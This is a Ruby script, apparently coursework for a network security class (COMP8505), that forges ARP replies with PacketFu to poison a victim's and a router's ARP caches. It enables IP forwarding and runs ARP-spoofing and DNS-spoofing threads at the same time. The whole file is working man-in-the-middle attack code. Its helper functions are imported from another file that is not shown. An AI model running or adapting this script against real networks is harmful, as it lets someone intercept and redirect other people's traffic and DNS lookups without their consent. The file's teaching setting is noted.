#!/usr/bin/env ruby
require 'rubygems'
require 'thread'
require 'packetfu'
require 'arp.rb'

include PacketFu
# This is the main program that will activate the ARP spoofing and DNS Spoofer
# functions in two separate threads.
# A00746060
# Harjinder Khatkar
# COMP8505
# ARP code is from example in class.

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr = '20:c9:d0:b6:08:99'       # sender's MAC address
arp_packet_target.eth_daddr = @victimMac # target's MAC address
arp_packet_target.arp_saddr_mac = '20:c9:d0:b6:08:99'   # sender's MAC address
arp_packet_target.arp_daddr_mac = @victimMac   # target's MAC address
arp_packet_target.arp_saddr_ip = @routerIP      # router's IP
arp_packet_target.arp_daddr_ip = @addr        # target's IP
arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply

# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = '20:c9:d0:b6:08:99'       # sender's MAC address
arp_packet_router.eth_daddr = @routerMac      # router's MAC address
arp_packet_router.arp_saddr_mac = '20:c9:d0:b6:08:99'   # sender's MAC address
arp_packet_router.arp_daddr_mac = @routerMac  # router's MAC address
arp_packet_router.arp_saddr_ip = @addr       # target's IP
arp_packet_router.arp_daddr_ip = @routerIP      # router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

# Enable IP forwarding
`sysctl -w net.inet.ip.forwarding=1`

begin
    
    puts "Starting the ARP poisoning thread..."
    #runspoof(arp_packet_target,arp_packet_router)
    
    arp_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
    puts "Starting the DNS spoofing thread..."
    dns_thread = Thread.new{dnsspoof_run}
    arp_thread.join
    dns_thread.join

    # Catch the interrupt and kill the threads
    rescue Interrupt
    puts "\nSpoof stopped by interrupt signal."
    Thread.kill(arp_thread)
    Thread.kill(dns_thread)
    `sysctl -w net.inet.ip.forwarding=0`
    exit 0

end